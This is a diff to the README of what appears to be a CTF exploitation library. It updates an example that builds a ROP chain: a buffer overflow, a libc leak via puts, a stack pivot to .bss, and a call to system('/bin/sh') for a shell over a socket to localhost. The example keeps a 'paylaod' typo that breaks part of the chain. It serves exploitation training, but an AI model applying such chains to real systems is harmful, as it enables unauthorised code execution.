@@ -56,38 +56,56 @@ Also, ELF class supports cache to reduce calculation.
 You can use some useful methods such as `got`, `plt`, `symbol`, `section` and so on.
 The following is an example to craft ROP stager.
 ```python
-# ROP chain
+"""
+Connect to host
+"""
+# Host name supports CTF-style
+sock = Socket("nc localhost 1234")
+# You can show hexdump for received/sent data for debug
+#sock.debug = True
+
+"""
+Write ROP chain
+"""
 addr_stage2 = elf.section(".bss") + 0x400
 
 payload = b'A' * 0x108
 payload += flat([
   # puts(puts@got)
-  next(elf.gadgets("pop rdi; ret;")),
+  next(elf.gadget("pop rdi; ret;")),
   elf.got("puts"),
   elf.plt("puts"),
   # gets(stage2)
-  next(elf.gadgets("pop rdi; ret;")),
+  next(elf.gadget("pop rdi; ret;")),
   addr_stage2,
   elf.plt("gets"),
   # stack pivot
-  next(elf.gadgets("pop rbp; ret;")),
+  next(elf.gadget("pop rbp; ret;")),
   addr_stage2,
-  rop_leave_ret
+  next(elf.gadget("leave\n ret")) # GCC-style
 ], map=p64)
 sock.sendlineafter("Data: ", payload)
 
-# Leak libc address
-libc_base = u64(sock.recvline()) - libc.symbol("puts")
-logger.info("libc base = " + hex(libc_base))
-libc.base = libc_base
+"""
+Leak libc address
+"""
+# You don't need to fill 8 bytes for u64
+leak = u64(sock.recvline())
+# This will show warning if base address looks incorrect
+libc.base = leak - libc.symbol("puts")
 
 payload  = b'A' * 8
-paylaod += p64(rop_pop_rdi)
+paylaod += p64(next(elf.gadget("ret")))
+# Automatically rebase after <ELF>.base is set
 payload += p64(next(libc.search("/bin/sh")))
 payload += p64(libc.symbol("system"))
+
+# Shows warning if payload contains a character `gets` cannot accept
+is_gets_safe(payload) # is_[cin/fgets/gets/getline/scanf/stream]_safe
+
 sock.sendline(payload)
 
-sock.interactive()
+sock.sh() # or sock.interactive()
 ```
 
 ## Install
